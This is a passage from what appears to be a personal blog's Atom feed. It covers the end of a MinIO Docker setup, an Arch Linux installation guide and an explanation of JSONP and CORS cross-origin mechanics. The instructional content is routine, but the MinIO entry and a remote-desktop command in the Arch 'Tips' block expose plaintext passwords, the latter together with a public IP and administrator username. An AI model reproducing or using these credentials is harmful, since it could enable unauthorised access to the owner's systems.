class=&quot;string&quot;&gt;&amp;quot;MINIO_ROOT_USER=IHCVodsfa23jsksssv12&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -e &lt;span class=&quot;string&quot;&gt;&amp;quot;MINIO_ROOT_PASSWORD=IUH2ioh23xxIid33&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  -e MINIO_SERVER_URL=http://localhost:9000 \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  quay.io/minio/minio server /data \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  --address &lt;span class=&quot;string&quot;&gt;&amp;quot;:9000&amp;quot;&lt;/span&gt; --console-address &lt;span class=&quot;string&quot;&gt;&amp;quot;:9001&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;设置启动docker便自启动容器&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker update --restart=always minio1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="HackStyle" scheme="https://resek4.github.io/categories/HackStyle/"/>
    
    
  </entry>
  
  <entry>
    <title>Arch Linux 全流程安装纪实</title>
    <link href="https://resek4.github.io/2022/10/26/Arch%20Linux%20%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/"/>
    <id>https://resek4.github.io/2022/10/26/Arch%20Linux%20%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/</id>
    <published>2022-10-25T17:52:00.000Z</published>
    <updated>2023-01-26T17:47:46.316Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br><span class="line">rdesktop 192.144.238.188 -u administrator -p 0Xiao4Sheng2Ye6</span><br><span class="line">prime-run vboxmanage startvm <span class="string">&quot;Win10&quot;</span> --<span class="built_in">type</span> gui</span><br><span class="line">archlinux-java status</span><br><span class="line">proxychains systemsettings5</span><br><span class="line">radeontop</span><br><span class="line">nvidia-smi</span><br><span class="line">lspci | grep -E <span class="string">&#x27;VGA|3D&#x27;</span></span><br><span class="line">HTTP_PROXY=127.0.0.1:1089</span><br><span class="line">HTTPS_PROXY=127.0.0.1:1089</span><br><span class="line">sudo balooctl <span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">ctrl+z</span><br><span class="line"><span class="comment"># 将当前进程放到后台挂起</span></span><br><span class="line"><span class="built_in">bg</span></span><br><span class="line"><span class="comment"># 将挂起进程放到后台执行</span></span><br><span class="line"><span class="built_in">fg</span> </span><br><span class="line"><span class="comment">#将后台执行进程放到前台执行</span></span><br></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/138951848">2021 Archlinux双系统安装教程（超详细） - 知乎</a><br><a href="https://www.viseator.com/2017/05/17/arch_install/">以官方Wiki的方式安装ArchLinux | viseator’s blog</a></p><span id="more"></span><h1 id="0x00-安装前期准备"><a href="#0x00-安装前期准备" class="headerlink" title="0x00.安装前期准备"></a>0x00.安装前期准备</h1><ul><li>将Arch的镜像安装到安装介质中</li><li>使用Arch启动盘开机启动安装程序</li><li>使用<code>fdisk</code>&#x2F;<code>cfdisk</code>进行分盘<br>可以使用<code>lsblk</code>查看分盘情况</li></ul><h1 id="0x01-相关引导设置"><a href="#0x01-相关引导设置" class="headerlink" title="0x01.相关引导设置"></a>0x01.相关引导设置</h1><h2 id="创建引导分区"><a href="#创建引导分区" class="headerlink" title="创建引导分区"></a>创建引导分区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/引导分区</span><br></pre></td></tr></table></figure><h2 id="创建根分区"><a href="#创建根分区" class="headerlink" title="创建根分区"></a>创建根分区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 /dev/根分区</span><br></pre></td></tr></table></figure><h2 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建/mnt/boot文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/boot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载引导分区</span></span><br><span class="line">mount /dev/引导分区 /mnt/boot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载根分区</span></span><br><span class="line">mount /dev/根分区 /mnt</span><br></pre></td></tr></table></figure><h1 id="0x02-联网"><a href="#0x02-联网" class="headerlink" title="0x02.联网"></a>0x02.联网</h1><h2 id="连接无线网络"><a href="#连接无线网络" class="headerlink" title="连接无线网络"></a>连接无线网络</h2><ul><li>使用<code>iwctl</code>进入iwd模式，并依次使用以下命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 寻找当前可使用网卡</span></span><br><span class="line">device list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用相应网卡进行网络扫描</span></span><br><span class="line">station wlan0 scan</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示已经扫描到的网络</span></span><br><span class="line">station wlan0 get-networks</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接选中的网络，并输入密码</span></span><br><span class="line">station wlan0 connect 选中的网络</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="更改系统时间"><a href="#更改系统时间" class="headerlink" title="更改系统时间"></a>更改系统时间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="0x03-安装基本系统及组件"><a href="#0x03-安装基本系统及组件" class="headerlink" title="0x03.安装基本系统及组件"></a>0x03.安装基本系统及组件</h1><h2 id="改变镜像源"><a href="#改变镜像源" class="headerlink" title="改变镜像源"></a>改变镜像源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入镜像源文件夹</span></span><br><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加以下镜像源</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清华大学</span></span><br><span class="line">Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line"><span class="comment">## 163</span></span><br><span class="line">Server = http://mirrors.163.com/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br><span class="line"><span class="comment">## aliyun</span></span><br><span class="line">Server = http://mirrors.aliyun.com/archlinux/<span class="variable">$repo</span>/os/<span class="variable">$arch</span></span><br></pre></td></tr></table></figure><h2 id="安装基本系统"><a href="#安装基本系统" class="headerlink" title="安装基本系统"></a>安装基本系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware dhcpcd</span><br></pre></td></tr></table></figure><h2 id="生成自动挂载分区的文件"><a href="#生成自动挂载分区的文件" class="headerlink" title="生成自动挂载分区的文件"></a>生成自动挂载分区的文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成自动挂载分区的文件</span></span><br><span class="line">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以查看确定相关生成的文件</span></span><br><span class="line"><span class="built_in">cat</span> /mnt/etc/fstab</span><br></pre></td></tr></table></figure><h2 id="进入安装的系统本身"><a href="#进入安装的系统本身" class="headerlink" title="进入安装的系统本身"></a>进入安装的系统本身</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure><h1 id="（可选）如果安装的Arch-Linux属于双系统"><a href="#（可选）如果安装的Arch-Linux属于双系统" class="headerlink" title="（可选）如果安装的Arch Linux属于双系统"></a>（可选）如果安装的Arch Linux属于双系统</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在已经安装好的系统内执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装必要的Bootloader</span></span><br><span class="line">pacman -S os-prober grub efibootmgr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑相关配置文件，并取消如下命令的注释</span></span><br><span class="line">vim /etc/default/grub</span><br><span class="line"><span class="comment"># GRUB_DISABLE_OS_PROBER=false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署探测工具，执行这步前需确定引导分区依旧被挂载着</span></span><br><span class="line"><span class="comment"># mount /dev/引导分区 /mnt/boot 被执行过了</span></span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署探测配置文件</span></span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><h1 id="0x04-进入系统后需要进行的设置"><a href="#0x04-进入系统后需要进行的设置" class="headerlink" title="0x04.进入系统后需要进行的设置"></a>0x04.进入系统后需要进行的设置</h1><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><h2 id="安装必要安装的安装包"><a href="#安装必要安装的安装包" class="headerlink" title="安装必要安装的安装包"></a>安装必要安装的安装包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S neovim dialog wpa_supplicant ntfs-3g networkmanager netctl</span><br></pre></td></tr></table></figure><h2 id="设置locale语言选项"><a href="#设置locale语言选项" class="headerlink" title="设置locale语言选项"></a>设置locale语言选项</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑相关文件</span></span><br><span class="line">vim /etc/locale.gen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去掉en_US zh_CN的各个utf8的注释</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成相关语言设置</span></span><br><span class="line">locale-gen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建默认语言配置文件，并向其中写入如下配置</span></span><br><span class="line">vim /etc/locale.conf</span><br><span class="line">LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure><h2 id="更改Linux系统的通用设置"><a href="#更改Linux系统的通用设置" class="headerlink" title="更改Linux系统的通用设置"></a>更改Linux系统的通用设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改/etc/hostname</span></span><br><span class="line">vim /etc/hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改hosts文件</span></span><br><span class="line">vim /etc/hosts</span><br><span class="line"></span><br><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost</span><br><span class="line">127.0.1.1myhostname.localdomainmyhostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改root密码</span></span><br><span class="line">passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立新账户，并更改改用户的密码</span></span><br><span class="line">useradd -m -G wheel resek4</span><br><span class="line">passwd resek4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对建立的新用户进行sudo权限组的设置</span></span><br><span class="line">EDITOR=vim visudo</span><br><span class="line"><span class="comment"># 找到 # %wheel 回车这行，删除注释</span></span><br></pre></td></tr></table></figure><h2 id="设置网络"><a href="#设置网络" class="headerlink" title="设置网络"></a>设置网络</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使能系统开机启动项</span></span><br><span class="line">systemctl <span class="built_in">enable</span> --now NetworkManager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置wifi</span></span><br><span class="line">nmtui</span><br></pre></td></tr></table></figure><h2 id="安装yay"><a href="#安装yay" class="headerlink" title="安装yay"></a>安装yay</h2><p><a href="https://linux.cn/article-14846-1.html">技术|初级：如何在 Arch Linux 中安装 Yay AUR 助手</a><br><a href="https://suiahae.me/yay-s-guide-No-2-proxy-issues/">yay 指南: 2. 代理问题</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">sudo git <span class="built_in">clone</span> https://aur.archlinux.org/yay.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找组</span></span><br><span class="line"><span class="built_in">id</span> resek4</span><br><span class="line"><span class="comment"># 更改yay所有权</span></span><br><span class="line">sudo <span class="built_in">chown</span> -R debugpoint:<span class="built_in">users</span> ./yay</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入yay目录</span></span><br><span class="line"><span class="built_in">cd</span> yay</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> GO111MODULE=on</span><br><span class="line"><span class="built_in">export</span> GOPROXY=https://goproxy.cn</span><br><span class="line"></span><br><span class="line">makepkg -si</span><br></pre></td></tr></table></figure><h2 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xf86-video-amdgpu nvidia nvidia-utils</span><br></pre></td></tr></table></figure><h2 id="Display-Server"><a href="#Display-Server" class="headerlink" title="Display Server"></a>Display Server</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xorg</span><br></pre></td></tr></table></figure><h2 id="Display-Manager"><a href="#Display-Manager" class="headerlink" title="Display Manager"></a>Display Manager</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S sddm</span><br></pre></td></tr></table></figure><p>设置开机启动</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable sddm</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Tips&quot;&gt;&lt;a href=&quot;#Tips&quot; class=&quot;headerlink&quot; title=&quot;Tips:&quot;&gt;&lt;/a&gt;Tips:&lt;/h1&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;chsh -s /bin/zsh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rdesktop 192.144.238.188 -u administrator -p 0Xiao4Sheng2Ye6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;prime-run vboxmanage startvm &lt;span class=&quot;string&quot;&gt;&amp;quot;Win10&amp;quot;&lt;/span&gt; --&lt;span class=&quot;built_in&quot;&gt;type&lt;/span&gt; gui&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;archlinux-java status&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;proxychains systemsettings5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;radeontop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nvidia-smi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;lspci | grep -E &lt;span class=&quot;string&quot;&gt;&amp;#x27;VGA|3D&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HTTP_PROXY=127.0.0.1:1089&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HTTPS_PROXY=127.0.0.1:1089&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo balooctl &lt;span class=&quot;built_in&quot;&gt;disable&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ctrl+z&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 将当前进程放到后台挂起&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;bg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 将挂起进程放到后台执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;fg&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#将后台执行进程放到前台执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/138951848&quot;&gt;2021 Archlinux双系统安装教程（超详细） - 知乎&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.viseator.com/2017/05/17/arch_install/&quot;&gt;以官方Wiki的方式安装ArchLinux | viseator’s blog&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Toolkit" scheme="https://resek4.github.io/categories/Toolkit/"/>
    
    
  </entry>
  
  <entry>
    <title>关于 JSONP 及 CORS 绕过同源策略的原理解释</title>
    <link href="https://resek4.github.io/2022/10/03/JSONP%E8%B7%A8%E5%9F%9F/"/>
    <id>https://resek4.github.io/2022/10/03/JSONP%E8%B7%A8%E5%9F%9F/</id>
    <published>2022-10-02T16:00:00.000Z</published>
    <updated>2023-01-27T09:46:43.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JSONP-跨域"><a href="#JSONP-跨域" class="headerlink" title="JSONP 跨域"></a>JSONP 跨域</h1><blockquote><p>JSONP 的全名叫做 <strong>JSON Padding</strong></p></blockquote><ul><li>其出现的目的不是为了解决跨域问题，而是在 HTML 中的 Javascript 调用出现的历史遗留问题<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://127.0.0.1/func.js?call</span>=<span class="string">callfunc</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>这样形式的 src 远程调用，会自动绕过同源策略的限制，直接访问远程的 <code>func.js</code> 文件中的 <code>callfunc</code> 函数，并供 JS 在后续解析为 JSON  格式进行返回</li></ul><p>而之所以叫 JSON Padding，是因为例如如下的简单实现，访问完远端 JS 文件中的 callfun 函数后（或称之为 API 后），<strong>远程的内容返回到该 HTML 文件的格式为使用 JSON 的数据封装</strong>（例如这种格式：<code>callback(&#123;&quot;name&quot;:&quot;hax&quot;,&quot;gender&quot;:&quot;Male&quot;&#125;)</code>）</p><span id="more"></span><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">receive <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;qwerty&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">callfun</span>(<span class="params">data</span>) &#123;<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;qwerty&#x27;</span>).<span class="property">innerHTML</span> = data; &#125; </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:10010/js?call=callfun&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CORS-跨域"><a href="#CORS-跨域" class="headerlink" title="CORS 跨域"></a>CORS 跨域</h1><p><strong>CORS 是服务端的跨域设置</strong>，因为同源策略的原因，浏览器会限制跨域的 HTTP 请求，当跨域访问发起时，浏览器会使用 OPTIONS 方法发起一个预检请求（preflight request） ，待服务器确认可以访问后，再发送实际跨域请求。</p><p><strong>跨域请求</strong>可能会用到如下 HEADER 头：</p><ul><li><code>origin</code> 预检请求（或实际请求）的原站名称</li><li><code>Access-Control-Request-Method</code> 告诉服务器跨域请求会用到的方法</li><li><code>Access-Control-Request-Headers</code> 告诉服务器会带的 HEADER 头</li></ul><p>而如果服务器同意跨域，则会向客户端发起如下<strong>跨域响应</strong>：</p><ul><li><code>Access-Control-Allow-Origin</code> <em>用于响应预检请求</em>，服务器允许跨域的 URI</li><li><code>Access-Control-Allow-Methods</code> <em>用于响应预检请求</em>，实际请求的允许的 HTTP 方法</li><li><code>Access-Control-Allow-Headers</code> <em>用于响应预检请求</em>，指明实际请求允许携带的 HEADER</li><li><code>Access-Control-Expose-Headers</code> 服务端自定义的 HEADER 只有在这里设置，客户端才能正常访问</li><li><code>Access-Control-Max-Age</code> 预检请求的缓存时间</li><li><code>Access-Control-Allow-Credentials</code> 如果请求中有 <code>credentials=true</code> 而服务端的这个 HERDER 却没有设置为 <code>true</code> 的时候，浏览器是不会把服务器返回的数据发回给请求者</li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;JSONP-跨域&quot;&gt;&lt;a href=&quot;#JSONP-跨域&quot; class=&quot;headerlink&quot; title=&quot;JSONP 跨域&quot;&gt;&lt;/a&gt;JSONP 跨域&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JSONP 的全名叫做 &lt;strong&gt;JSON Padding&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;其出现的目的不是为了解决跨域问题，而是在 HTML 中的 Javascript 调用出现的历史遗留问题&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;http://127.0.0.1/func.js?call&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;callfunc&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
这样形式的 src 远程调用，会自动绕过同源策略的限制，直接访问远程的 &lt;code&gt;func.js&lt;/code&gt; 文件中的 &lt;code&gt;callfunc&lt;/code&gt; 函数，并供 JS 在后续解析为 JSON  格式进行返回&lt;/li&gt;
&lt;/ul&gt;
